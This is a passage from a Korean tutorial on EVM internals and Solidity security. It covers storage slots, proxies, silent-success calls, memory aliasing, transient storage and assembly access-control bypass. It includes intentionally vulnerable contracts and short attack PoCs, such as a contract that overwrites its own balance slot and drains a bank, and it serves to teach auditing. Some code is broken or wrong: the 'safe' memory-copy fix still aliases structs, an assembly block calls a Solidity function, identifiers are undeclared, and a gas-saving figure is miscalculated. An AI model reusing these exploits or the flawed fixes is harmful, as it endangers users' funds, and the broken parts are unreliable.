├─────────┼────────────────────────────────────────────────────────────────┤
│  0      │  [  a (uint256, 32바이트)                                    ] │
├─────────┼────────────────────────────────────────────────────────────────┤
│  1      │  [ c (uint96, 12B) ][ b (address, 20B)                      ] │
├─────────┼────────────────────────────────────────────────────────────────┤
│  2      │  [ e (uint248, 31B)                                       ][d] │
├─────────┼────────────────────────────────────────────────────────────────┤
│  3      │  [  f (uint256, 32바이트)                                    ] │
└─────────┴────────────────────────────────────────────────────────────────┘
주의: EVM은 슬롯을 big-endian으로 처리하지만 패킹은 오른쪽(낮은 바이트)부터
```

#### 동적 배열: keccak256(slot) + index

```solidity
contract DynamicArrayStorage {
    uint256[] public arr;  // slot 0에는 배열의 길이가 저장됨

    // arr[i]의 스토리지 위치:
    // keccak256(abi.encodePacked(uint256(0))) + i
    //
    // 예시: arr[0] → keccak256(0x00...00) + 0
    //       arr[1] → keccak256(0x00...00) + 1

    function getSlot(uint256 index) external pure returns (bytes32) {
        bytes32 baseSlot = keccak256(abi.encodePacked(uint256(0)));
        return bytes32(uint256(baseSlot) + index);
    }
}
```

#### 매핑: keccak256(key ++ slot)

```solidity
contract MappingStorage {
    mapping(address => uint256) public balances;  // slot 0
    mapping(address => mapping(address => uint256)) public allowances;  // slot 1

    // balances[addr]의 스토리지 위치:
    // keccak256(abi.encodePacked(addr, uint256(0)))

    function getBalanceSlot(address addr) external pure returns (bytes32) {
        return keccak256(abi.encodePacked(addr, uint256(0)));
    }

    // allowances[owner][spender]의 스토리지 위치:
    // keccak256(abi.encodePacked(spender, keccak256(abi.encodePacked(owner, uint256(1)))))

    function getAllowanceSlot(address owner, address spender) external pure returns (bytes32) {
        bytes32 ownerSlot = keccak256(abi.encodePacked(owner, uint256(1)));
        return keccak256(abi.encodePacked(spender, ownerSlot));
    }
}
```

```
매핑 슬롯 계산 시각화:

mapping(address => uint256) balances  // at slot 0

balances[0xAlice]:
keccak256( 0xAlice (32바이트로 패딩) ++ 0x00...00 (slot 번호) )
         └──────────────────────────────────────────────────────┘
                         64바이트 입력

중첩 매핑 allowances[owner][spender]:
Step 1: keccak256( owner ++ slot_1 ) → intermediate
Step 2: keccak256( spender ++ intermediate ) → final slot
```

#### 직접 스토리지 읽기 (Foundry)

```bash
# Foundry cast를 사용한 스토리지 슬롯 직접 읽기
cast storage <CONTRACT_ADDRESS> <SLOT_NUMBER> --rpc-url <RPC_URL>

# 예시: slot 0 읽기
cast storage 0x1234...abcd 0

# 동적 배열 길이 읽기
cast storage 0x1234...abcd 0  # → 배열 길이

# 배열 원소 슬롯 계산
cast keccak "0x0000000000000000000000000000000000000000000000000000000000000000"
```

---

### 2.2 스토리지 슬롯 패킹

#### 32바이트 미만 변수 패킹 규칙

Solidity 컴파일러는 연속된 소형 변수를 동일 슬롯에 패킹한다. 패킹 규칙:

1. 선언 순서대로 오른쪽(낮은 바이트)부터 채움
2. 다음 변수가 현재 슬롯의 남은 공간에 들어가지 않으면 새 슬롯 사용
3. 구조체와 배열은 항상 새 슬롯에서 시작

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 비효율적 레이아웃 (가스 낭비)
contract InefficientLayout {
    bool a;        // slot 0: 1바이트만 사용 (31바이트 낭비)
    uint256 b;     // slot 1: 256비트 전체 (a와 패킹 불가 - b가 32바이트)
    bool c;        // slot 2: 1바이트만 사용
    uint256 d;     // slot 3
    // 총 4 슬롯 사용
}

// 효율적 레이아웃 (패킹 최적화)
contract EfficientLayout {
    bool a;        // slot 0 시작
    bool c;        // slot 0: a와 패킹 (a 다음 바이트)
    uint256 b;     // slot 1: 32바이트 전체 필요
    uint256 d;     // slot 2
    // 총 3 슬롯 사용 → SLOAD/SSTORE 비용 절감
}

// 가스 비용 비교 (대략):
// - 별도 슬롯: SLOAD 한 번당 2100 gas (cold), 100 gas (warm)
// - 같은 슬롯: 두 변수 접근이 단일 SLOAD/SSTORE로 처리됨
```

#### 패킹의 보안 트레이드오프

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 패킹이 초래하는 보안 문제: 타입 캐스팅과 조합

contract PackingSecurityIssue {
    // slot 0에 패킹
    uint128 public lowBalance;   // 하위 16바이트
    uint128 public highBalance;  // 상위 16바이트

    // 취약: 어셈블리로 슬롯 전체를 직접 쓸 때 패킹 구조 파괴 가능
    function dangerousWrite(uint256 rawValue) external {
        assembly {
            sstore(0, rawValue)  // slot 0 전체를 rawValue로 덮어씀
            // lowBalance와 highBalance 모두 변경됨!
        }
    }

    // 안전: Solidity를 통한 접근
    function safeWrite(uint128 low, uint128 high) external {
        lowBalance = low;
        highBalance = high;
    }
}

// 실제 취약 패턴: 패킹된 변수의 읽기-수정-쓰기 레이스
contract PackingRaceCondition {
    // slot 0에 패킹된 두 카운터
    uint128 public counter1;  // 하위
    uint128 public counter2;  // 상위

    // 두 카운터를 별도 트랜잭션으로 수정하면 race condition 없음 (단일 슬롯이므로)
    // 하지만 어셈블리 레벨에서 partial write 오류 가능
    function incrementBoth() external {
        // Solidity는 슬롯 전체를 읽고 → 수정 → 전체를 씀
        // 이 과정에서 중간 상태가 외부에 노출됨
        counter1++;  // 내부적으로: SLOAD slot0, 하위 128비트 증가, SSTORE slot0
        counter2++;  // 내부적으로: SLOAD slot0, 상위 128비트 증가, SSTORE slot0
        // 두 SSTORE가 같은 슬롯 → 두 번째가 첫 번째를 덮어씀 (올바름)
        // 단, 개별 트랜잭션에서의 동시성 문제는 없음 (EVM은 싱글 스레드)
    }
}
```

---

### 2.3 커스텀 스토리지 레이아웃 (프록시 패턴)

#### EIP-1967 표준 슬롯

EIP-1967은 업그레이드 가능한 프록시를 위한 표준 스토리지 슬롯을 정의한다. 일반 변수와 충돌하지 않도록 의도적으로 충돌 가능성이 낮은 슬롯을 사용한다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// EIP-1967 슬롯 계산:
// implementation: bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
// admin:          bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1)
// beacon:         bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1)

// "-1"을 하는 이유: preimage 공격 방지
// (해당 값이 어떤 keccak256 입력의 출력인지 알 수 없게 만듦)

library StorageSlot {
    struct AddressSlot {
        address value;
    }

    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}

contract EIP1967ProxyFull {
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    bytes32 private constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    event Upgraded(address indexed implementation);
    event AdminChanged(address previousAdmin, address newAdmin);

    constructor(address _logic, address _admin, bytes memory _data) payable {
        _setImplementation(_logic);
        _setAdmin(_admin);
        if (_data.length > 0) {
            (bool success,) = _logic.delegatecall(_data);
            require(success, "Initialization failed");
        }
    }

    modifier ifAdmin() {
        if (msg.sender == _getAdmin()) {
            _;
        } else {
            _fallback();
        }
    }

    function upgradeTo(address newImplementation) external ifAdmin {
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
    }

    function _getImplementation() internal view returns (address) {
        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;
    }

    function _setImplementation(address newImpl) private {
        require(newImpl.code.length > 0, "Not a contract");
        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImpl;
    }

    function _getAdmin() internal view returns (address) {
        return StorageSlot.getAddressSlot(ADMIN_SLOT).value;
    }

    function _setAdmin(address newAdmin) private {
        require(newAdmin != address(0), "Zero address");
        StorageSlot.getAddressSlot(ADMIN_SLOT).value = newAdmin;
    }

    function _fallback() internal {
        address impl = _getImplementation();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    fallback() external payable { _fallback(); }
    receive() external payable { _fallback(); }
}
```

#### EIP-7201 네임스페이스 스토리지

EIP-7201은 다이아몬드 패턴이나 복잡한 업그레이드 시스템에서 스토리지 충돌을 방지하는 네임스페이스 기반 접근법이다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// EIP-7201: 네임스페이스 스토리지
// 슬롯 = keccak256(abi.encode(uint256(keccak256(id)) - 1)) & ~bytes32(uint256(0xff))

contract EIP7201Example {
    // 네임스페이스 ID 정의
    // @custom:storage-location erc7201:myapp.main
    bytes32 private constant MAIN_STORAGE_LOCATION =
        0x... ; // 실제 계산값

    struct MainStorage {
        address owner;
        uint256 totalSupply;
        mapping(address => uint256) balances;
    }

    function _getMainStorage() private pure returns (MainStorage storage $) {
        bytes32 slot = MAIN_STORAGE_LOCATION;
        assembly {
            $.slot := slot
        }
    }

    function getOwner() external view returns (address) {
        return _getMainStorage().owner;
    }
}

// 슬롯 계산 방법 (Python):
// import eth_abi
// from eth_utils import keccak
//
// namespace_id = b"myapp.main"
// inner = int.from_bytes(keccak(namespace_id), 'big') - 1
// inner_bytes = inner.to_bytes(32, 'big')
// slot = int.from_bytes(keccak(inner_bytes), 'big') & ~0xff
// print(hex(slot))
```

#### 수동 슬롯 계산 오류 위험

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 실제 버그 패턴: 잘못된 수동 슬롯 계산

contract BuggyManualSlot {
    // 개발자가 의도한 것: keccak256("my.storage") - 1
    // 실수로 -1 없이 사용:
    bytes32 private constant SLOT =
        keccak256("my.storage");  // 버그! -1 누락

    // 문제: 만약 누군가 "my.storage"를 keccak256 입력으로 가진 preimage 공격 가능
    // (현실적으로는 거의 불가능하지만 표준을 따르지 않은 것)

    // 올바른 방법:
    bytes32 private constant SLOT_CORRECT =
        bytes32(uint256(keccak256("my.storage")) - 1);
}

// 더 심각한 버그: 슬롯 번호 하드코딩 오류
contract HardcodedSlotBug {
    // 개발자가 수동으로 계산한 슬롯 번호가 틀린 경우
    bytes32 private constant WRONG_SLOT = bytes32(uint256(42));

    // 일반 변수 선언:
    uint256 public normalVar;  // slot 0 (컴파일러 할당)

    // 만약 다른 상속된 컨트랙트에 slot 42를 사용하는 변수가 있다면 충돌!
    function readWrongSlot() external view returns (bytes32 value) {
        assembly {
            value := sload(42)  // 다른 변수를 읽을 수 있음
        }
    }
}
```

---

### 2.4 low-level call 사일런트 성공

#### 존재하지 않는 주소에 대한 call

EVM 명세에 따르면, **존재하지 않는 주소(code가 없는 EOA 또는 아직 생성되지 않은 주소)에 대한 `call`은 `success=true`를 반환하고 `returndata`는 빈 값**이다.

```
call 동작 규칙:
┌─────────────────────────────────┬─────────────────────────────────┐
│  대상 주소 상태                  │  call 결과                       │
├─────────────────────────────────┼─────────────────────────────────┤
│  code가 있는 컨트랙트            │  코드 실행, 실행 결과에 따라 반환  │
│  ETH 잔고만 있는 EOA             │  success=true, returndata=empty │
│  ETH 없는 EOA (nonce=0)         │  success=true, returndata=empty │
│  존재하지 않는 주소              │  success=true, returndata=empty │
│  0 value로 새 주소 호출          │  success=true (계정 생성 안 함)  │
└─────────────────────────────────┴─────────────────────────────────┘
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 취약: 존재하지 않는 토큰 주소에 call
contract VulnerableTokenTransfer {
    address public tokenAddress;

    constructor(address _token) {
        tokenAddress = _token;
    }

    // 취약: tokenAddress가 실제 컨트랙트인지 확인 안 함
    function transfer(address to, uint256 amount) external returns (bool) {
        (bool success, bytes memory data) = tokenAddress.call(
            abi.encodeWithSignature("transfer(address,uint256)", to, amount)
        );
        // tokenAddress가 EOA이면: success=true, data=empty
        // 빈 데이터를 bool로 디코딩하면 false 또는 디코딩 오류
        // 하지만 success가 true이므로 require(success)는 통과
        require(success, "Transfer failed");
        return true;  // 실제로는 전송 안 됐지만 성공으로 처리!
    }
}

// 이 패턴을 이용한 공격:
// 1. token 주소로 EOA 또는 빈 주소를 설정
// 2. transfer 호출 → 실제 전송 없이 success=true
// 3. 상위 로직이 전송이 완료됐다고 착각

// 안전한 버전
contract SafeTokenTransfer {
    address public tokenAddress;

    constructor(address _token) {
        // 배포 시 코드 존재 확인
        require(_token.code.length > 0, "Not a contract");
        tokenAddress = _token;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        // 실행 전 코드 존재 확인
        require(tokenAddress.code.length > 0, "Token is not a contract");

        (bool success, bytes memory data) = tokenAddress.call(
            abi.encodeWithSignature("transfer(address,uint256)", to, amount)
        );
        require(success, "Call failed");

        // 반환 데이터 검증
        if (data.length > 0) {
            require(abi.decode(data, (bool)), "Transfer returned false");
        }
        // data.length == 0이면: 일부 토큰은 return값 없음 (USDT 등)
        // 이 경우 success=true만으로 판단

        return true;
    }
}

// OpenZeppelin SafeERC20 패턴 (참고)
// safeTransfer는 내부적으로 유사한 로직을 사용:
// 1. call 실행
// 2. success 확인
// 3. returndata가 있으면 bool 디코딩 확인
// 4. returndata가 없어도 허용 (일부 ERC20은 반환값 없음)
```

#### PoC: 사일런트 성공 이용

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract SilentSuccessTest is Test {
    function testSilentSuccess() public {
        // 존재하지 않는 주소
        address nonExistent = address(0xDEAD);

        // code.length 확인
        assertEq(nonExistent.code.length, 0);

        // call은 성공으로 반환
        (bool success, bytes memory data) = nonExistent.call(
            abi.encodeWithSignature("anyFunction()")
        );
        assertTrue(success, "Should succeed silently");
        assertEq(data.length, 0, "Should return empty data");
    }

    function testSilentSuccessWithValue() public {
        address nonExistent = address(0xBEEF);

        // ETH 전송도 성공
        vm.deal(address(this), 1 ether);
        (bool success,) = nonExistent.call{value: 0.1 ether}("");
        assertTrue(success);
        // 0xBEEF의 잔고: 0.1 ether (계정이 생성됨)
        assertEq(nonExistent.balance, 0.1 ether);
    }
}
```

---

### 2.5 memory-to-memory 참조 (앨리어싱 버그)

#### Solidity 메모리 참조 동작

Solidity에서 메모리 배열, 구조체, 문자열은 **참조(reference) 타입**이다. `memory` 변수에 다른 `memory` 변수를 할당하면 **복사가 아니라 참조(포인터)**가 복사된다.

```
메모리 참조 vs 값 복사:

┌──────────────────────────────────────────────────────────────┐
│  메모리 레이아웃                                              │
│                                                              │
│  0x00: [  스크래치 패드 (32바이트)  ]                         │
│  0x20: [  스크래치 패드 (32바이트)  ]                         │
│  0x40: [  free memory pointer      ] ← 새 할당 위치 추적      │
│  0x60: [  zero slot (불변)         ]                         │
│  0x80: [  실제 메모리 시작          ]                         │
│                                                              │
│  uint256[] a = new uint256[](3) → 0x80에 할당               │
│  uint256[] b = a               → b는 0x80을 가리킴 (같은 위치)│
│                                                              │
│  b[0] = 999  →  0x80+32의 내용이 변경됨                      │
│  a[0] == 999  →  동일한 메모리를 가리키므로 변경 반영됨!       │
└──────────────────────────────────────────────────────────────┘
```

#### PoC 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract MemoryAliasingBug {
    struct Order {
        address buyer;
        uint256 amount;
        bool fulfilled;
    }

    // 취약: 메모리 앨리어싱으로 의도치 않은 수정
    function processOrders(Order[] memory orders) external pure returns (uint256 total) {
        // 이것은 복사가 아닌 참조!
        Order[] memory pendingOrders = orders;

        // pendingOrders를 수정하면 orders도 변경됨
        for (uint256 i = 0; i < pendingOrders.length; i++) {
            pendingOrders[i].fulfilled = true;  // orders[i].fulfilled도 true가 됨!
            total += pendingOrders[i].amount;
        }

        // 이 시점에서 orders의 모든 항목이 fulfilled = true
        // 함수 호출자는 원본 orders가 수정됐을 거라고 기대하지 않음
    }

    // 이 함수에서 orders가 수정된 상태로 사용됨
    function vulnerableWorkflow() external pure returns (bool) {
        Order[] memory orders = new Order[](2);
        orders[0] = Order({buyer: address(0x1), amount: 100, fulfilled: false});
        orders[1] = Order({buyer: address(0x2), amount: 200, fulfilled: false});

        uint256 total = processOrders(orders);  // orders가 내부에서 수정됨

        // 여기서 orders[0].fulfilled == true ← 의도치 않은 변경!
        // 이후 로직이 fulfilled 상태를 확인한다면 잘못된 동작
        for (uint256 i = 0; i < orders.length; i++) {
            if (!orders[i].fulfilled) {
                // 이 블록은 절대 실행되지 않음 (이미 모두 true)
                return false;
            }
        }
        return true;
    }

    // 올바른 접근: 명시적 복사
    function safeProcessOrders(Order[] memory orders)
        external
        pure
        returns (uint256 total)
    {
        // 명시적으로 새 배열 생성 → 독립적인 메모리 공간
        Order[] memory pendingOrders = new Order[](orders.length);
        for (uint256 i = 0; i < orders.length; i++) {
            pendingOrders[i] = orders[i];  // 구조체는 값 복사
        }

        for (uint256 i = 0; i < pendingOrders.length; i++) {
            pendingOrders[i].fulfilled = true;  // orders는 변경되지 않음
            total += pendingOrders[i].amount;
        }
    }
}

// 더 미묘한 앨리어싱 버그: 중첩 구조체
contract NestedAliasingBug {
    struct Position {
        uint256 size;
        uint256 price;
    }

    struct Portfolio {
        Position[] positions;
        uint256 totalValue;
    }

    function rebalance(Portfolio memory portfolio) internal pure {
        // portfolio.positions는 원본 배열의 참조
        for (uint256 i = 0; i < portfolio.positions.length; i++) {
            // 이 수정이 원본 데이터에 영향을 줄 수 있음
            portfolio.positions[i].size = 0;
        }
    }
}
```

#### 앨리어싱 버그 감지 방법

```bash
# Foundry에서 메모리 접근 추적
forge test --debug testFunctionName

# Slither로 정적 분석
slither . --detect memory-aliasing-bug  # (가상의 detector 이름)

# 실제 유용한 Slither detector:
slither . --detect uninitialized-local
```

---

### 2.6 Transient Storage (EIP-1153)

#### 개요 및 동작

**EIP-1153**은 Cancun 업그레이드(2024년 3월)에서 도입된 `TSTORE`/`TLOAD` opcode를 정의한다. Transient Storage는 다음 특성을 가진다:

```
Transient Storage vs Regular Storage:

┌─────────────────────┬──────────────────────────┬────────────────────────┐
│  특성               │  Storage (SSTORE/SLOAD)   │  Transient (TSTORE/TLOAD) │
├─────────────────────┼──────────────────────────┼────────────────────────┤
│  지속성             │  영구 (블록체인에 저장)    │  트랜잭션 내에서만 유지   │
│  초기값             │  0 (항상)                 │  0 (각 트랜잭션 시작 시)  │
│  쓰기 가스          │  ~20,000 (cold write)     │  100 gas                 │
│  읽기 가스          │  2,100 (cold), 100 (warm) │  100 gas                 │
│  리셋 시점          │  영원히 유지               │  트랜잭션 종료 시 자동    │
│  상속               │  다음 트랜잭션에서도 유지  │  매 트랜잭션마다 새로 시작 │
└─────────────────────┴──────────────────────────┴────────────────────────┘
```

#### 기본 사용법

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;  // TSTORE/TLOAD는 0.8.24+에서 지원

contract TransientStorageExample {
    // Transient Storage를 사용한 재진입 방지 (가스 효율적)
    bytes32 private constant LOCK_SLOT = keccak256("reentrancy.lock");

    modifier nonReentrantTransient() {
        assembly {
            if tload(LOCK_SLOT) { revert(0, 0) }
            tstore(LOCK_SLOT, 1)
        }
        _;
        assembly {
            tstore(LOCK_SLOT, 0)
        }
    }

    uint256 public balance;

    function deposit() external payable {
        balance += msg.value;
    }

    function withdraw(uint256 amount) external nonReentrantTransient {
        require(balance >= amount, "Insufficient balance");
        balance -= amount;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

#### Transient Storage 보안 영향

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// 보안 취약점 1: 교차 호출 프레임 상태 누출
contract TransientStorageLeakVulnerable {
    // 동일 트랜잭션 내의 다른 컨트랙트 호출에서 transient storage 접근 가능
    // (같은 컨트랙트의 transient storage만 읽을 수 있으므로 직접 누출은 아님)

    bytes32 private constant SECRET_SLOT = keccak256("secret.value");

    // 이 함수는 transient storage에 임시 비밀 저장
    function processWithSecret(uint256 secret) external {
        assembly {
            tstore(SECRET_SLOT, secret)
        }

        // 외부 컨트랙트 호출
        // 만약 호출된 컨트랙트가 현재 컨트랙트의 함수를 다시 호출하면
        // transient storage 값을 읽을 수 있음!
        externalContract.doSomething();

        assembly {
            tstore(SECRET_SLOT, 0)  // 클리어
        }
    }

    // 재진입으로 secret 읽기 가능
    function readSecret() external view returns (uint256 value) {
        assembly {
            value := tload(SECRET_SLOT)
        }
    }
}

// 보안 취약점 2: Transient Storage로 인한 잘못된 상태 가정
contract TransientStorageStateBug {
    bytes32 private constant APPROVED_SLOT = keccak256("flashloan.approved");

    // 플래시론 패턴에서 transient storage 오용
    function flashLoan(address token, uint256 amount, address receiver) external {
        // 승인 플래그 설정
        assembly {
            tstore(APPROVED_SLOT, 1)
        }

        // 토큰 전송 및 콜백
        // token.transfer(receiver, amount);
        IFlashLoanReceiver(receiver).onFlashLoan(token, amount);

        // 상환 확인
        // require(token.balanceOf(address(this)) >= originalBalance);

        assembly {
            tstore(APPROVED_SLOT, 0)
        }
    }

    // 취약: 내부 함수가 승인 플래그를 확인하지만
    // 동일 트랜잭션 내 다른 경로로 이 함수에 접근 가능
    function privilegedAction() external {
        uint256 approved;
        assembly {
            approved := tload(APPROVED_SLOT)
        }
        require(approved == 1, "Not in flash loan");
        // 특권 작업 수행...
        // 만약 다른 코드 경로에서 APPROVED_SLOT을 1로 설정할 수 있다면 취약
    }
}

// 안전한 Transient Storage 패턴
contract SafeTransientStorage {
    // 특정 호출자에 대한 잠금 (더 세밀한 제어)
    function _getLockSlot(address addr) private pure returns (bytes32) {
        return keccak256(abi.encodePacked("lock", addr));
    }

    modifier nonReentrantFor(address addr) {
        bytes32 slot = _getLockSlot(addr);
        assembly {
            if tload(slot) { revert(0, 0) }
            tstore(slot, 1)
        }
        _;
        assembly {
            tstore(_getLockSlot(addr), 0)
        }
    }
}
```

#### Transient Storage 가스 비용 분석

```
SSTORE vs TSTORE 가스 비용:

SSTORE (영구 스토리지):
┌─────────────────────────────────────────────────────┐
│  시나리오                         │  가스 비용       │
├─────────────────────────────────────────────────────┤
│  0 → nonzero (cold)              │  ~20,000        │
│  nonzero → nonzero (cold)        │  ~2,900         │
│  nonzero → 0 (refund)            │  ~100 + refund  │
│  warm write                       │  ~100           │
└─────────────────────────────────────────────────────┘

TSTORE (일시적 스토리지):
┌─────────────────────────────────────────────────────┐
│  시나리오                         │  가스 비용       │
├─────────────────────────────────────────────────────┤
│  any → any                       │  100            │
└─────────────────────────────────────────────────────┘

절감 효과:
- 재진입 방지 lock: 20,000 + 100 → 100 + 100 = 약 200배 절감!
- 트랜잭션 내 임시 데이터: 기존 패턴 대비 크게 절감
```

---

### 2.7 Yul/어셈블리 접근 제어 우회

#### Solidity 보호 장치와 Yul 우회

Solidity의 `modifier`, `require`, `private`은 언어 레벨의 보호 장치다. 그러나 인라인 어셈블리는 이 모든 보호를 무시하고 EVM 레벨에서 직접 동작한다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 취약 패턴: 어셈블리가 접근 제어를 우회
contract AccessControlBypass {
    address private owner;
    uint256 private secretValue;
    mapping(address => uint256) private balances;

    constructor() {
        owner = msg.sender;
        secretValue = 0x1337;
    }

    // "private"이어도 어셈블리로 직접 읽기 가능
    // (같은 컨트랙트 내의 어셈블리 블록에서)
    function readPrivateSlot() external view returns (uint256) {
        uint256 value;
        assembly {
            // slot 0 = owner, slot 1 = secretValue
            value := sload(1)  // secretValue 직접 읽기
        }
        return value;  // 0x1337 반환
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function adminFunction() external onlyOwner {
        // 정상적인 진입점은 onlyOwner로 보호
    }

    // 하지만 이 함수는 modifier 체크를 어셈블리로 우회
    function bypassModifier() external {
        // msg.sender가 owner가 아니어도 아래 작업 수행 가능
        // (이 함수 자체에는 modifier가 없음)
        assembly {
            // owner 슬롯에 msg.sender 쓰기
            sstore(0, caller())
        }
        // 이제 msg.sender가 owner가 됨!
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 실제 취약 패턴: 어셈블리를 통한 잔고 조작
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    // 취약: 어셈블리로 임의 잔고 수정 허용
    function updateBalance(address user, bytes calldata data) external {
        // 이 함수는 관리자 전용으로 의도됐지만 접근 제어 없음
        assembly {
            // calldata에서 직접 값을 읽어 스토리지에 씀
            // data는 (slot, value) 쌍이라고 가정
            let slot := calldataload(data.offset)
            let value := calldataload(add(data.offset, 32))
            sstore(slot, value)
        }
    }
}

// 공격: updateBalance를 통해 자신의 잔고를 임의로 설정
contract BankAttacker {
    VulnerableBank bank;

    constructor(address _bank) { bank = VulnerableBank(_bank); }

    function attack() external {
        // balances[address(this)]의 스토리지 슬롯 계산
        bytes32 balanceSlot = keccak256(abi.encodePacked(address(this), uint256(0)));
        uint256 hugeBalance = 1000 ether;

        // 슬롯과 값을 calldata로 전달
        bank.updateBalance(
            address(this),
            abi.encodePacked(balanceSlot, hugeBalance)
        );

        // 이제 잔고가 1000 ETH로 설정됨 → 인출 시도
        bank.withdraw(address(bank).balance);
    }
}
```

#### Yul 함수 접근 제어 베스트 프랙티스

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 안전한 어셈블리 패턴
contract SecureAssemblyPatterns {
    address private immutable OWNER;

    constructor() {
        OWNER = msg.sender;
    }

    // 어셈블리 블록 내에서도 접근 제어
    function secureAssemblyOperation(uint256 slot, uint256 value) external {
        // Solidity 레벨 체크 (어셈블리 블록 밖)
        require(msg.sender == OWNER, "Not owner");

        // 입력 유효성 검사
        require(slot < 100, "Invalid slot range");  // 슬롯 범위 제한

        assembly {
            sstore(slot, value)
        }
    }

    // 어셈블리 내부에서의 접근 제어
    function inlineAccessControl(uint256 slot, uint256 value) external {
        assembly {
            // caller() == OWNER 확인
            if iszero(eq(caller(), sload(0))) {  // slot 0 = OWNER
                revert(0, 0)
            }
            sstore(slot, value)
        }
    }
}
```

---

## 3. 실습 가이드

### 3.1 evm.codes Playground 활용법

[evm.codes](https://www.evm.codes/playground)는 브라우저에서 EVM bytecode를 직접 실행하고 스택/메모리/스토리지 상태를 시각적으로 확인할 수 있는 도구다.

#### 기본 사용 방법

```
1. 좌측 편집 창에 EVM 어셈블리 또는 16진수 바이트코드 입력
2. "Run" 버튼으로 전체 실행 또는 "Step" 으로 단계별 실행
3. 우측 패널에서 Stack / Memory / Storage / Return data 확인

예시: PUSH1 0x05 PUSH1 0x03 ADD STOP
바이트코드: 60 05 60 03 01 00

실행 후 스택: [0x08] (5 + 3 = 8)
```

#### 유용한 실습 시나리오

```
실습 1: 스토리지 레이아웃 확인
PUSH1 0x42    // 값 0x42
PUSH1 0x00    // 슬롯 0
SSTORE        // slot[0] = 0x42
PUSH1 0x00    // 슬롯 0
SLOAD         // 스택에 slot[0] 값 로드 → 0x42

실습 2: 메모리 할당
PUSH1 0x20    // 크기 32바이트
PUSH1 0x00    // 오프셋 0
MSTORE        // 나중에...
PUSH1 0x00    // 크기
PUSH1 0x00    // 오프셋
SHA3          // keccak256(mem[0:0]) 계산

실습 3: CREATE2 주소 계산
// (복잡한 바이트코드 시퀀스 - evm.codes에서 직접 실행)
```

#### evm.codes에서 디버깅 팁

```
1. "Gas" 패널로 각 opcode의 가스 비용 실시간 확인
2. "Return data" 패널로 RETURNDATASIZE, RETURNDATACOPY 동작 확인
3. JUMPDEST 태그로 점프 대상 명확히 확인
4. CALLDATA 탭에서 입력 데이터 설정 가능
```

---

### 3.2 Foundry forge debug 트레이싱

Foundry의 `forge debug` 명령은 특정 트랜잭션이나 테스트를 opcode 레벨로 추적한다.

#### 기본 설정

```bash
# foundry 설치 (이미 설치된 경우 생략)
curl -L https://foundry.paradigm.xyz | bash
foundryup

# 새 프로젝트 생성
forge init evm-internals-practice
cd evm-internals-practice
```

#### forge test와 trace 옵션

```bash
# 기본 테스트 실행
forge test

# 상세 트레이스 출력 (함수 콜 레벨)
forge test -vvv

# 최대 상세도 (opcode 레벨)
forge test -vvvv

# 특정 테스트만 실행
forge test --match-test testMetamorphicAttack -vvvv

# 가스 보고서
forge test --gas-report
```

#### forge debug 인터랙티브 디버거

```bash
# 인터랙티브 디버거 실행
forge test --debug testFunctionName

# 키 바인딩:
# [↑][↓] 또는 [k][j] : opcode 이동
# [g] : 처음으로
# [G] : 마지막으로
# [c] : 다음 CALL로 이동
# [C] : 이전 CALL로 이동
# [s] : step into
# [q] : 종료
```

#### 실용적인 Foundry 테스트 구조

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";

contract VulnerableContractTest is Test {
    VulnerableContract target;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        // 컨트랙트 배포
        target = new VulnerableContract();

        // 테스트 계정에 ETH 지급
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);

        // victim이 입금
        vm.prank(victim);
        target.deposit{value: 5 ether}();
    }

    // 취약점 재현 테스트
    function testExploit() public {
        // 초기 상태 기록
        uint256 victimBalanceBefore = address(victim).balance;
        uint256 contractBalanceBefore = address(target).balance;

        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Attacker balance before:", address(attacker).balance);

        // 공격 실행
        vm.startPrank(attacker);
        AttackContract attack = new AttackContract(address(target));
        attack.execute{value: 1 ether}();
        vm.stopPrank();

        // 결과 확인
        console.log("Contract balance after:", address(target).balance);
        console.log("Attacker balance after:", address(attacker).balance);

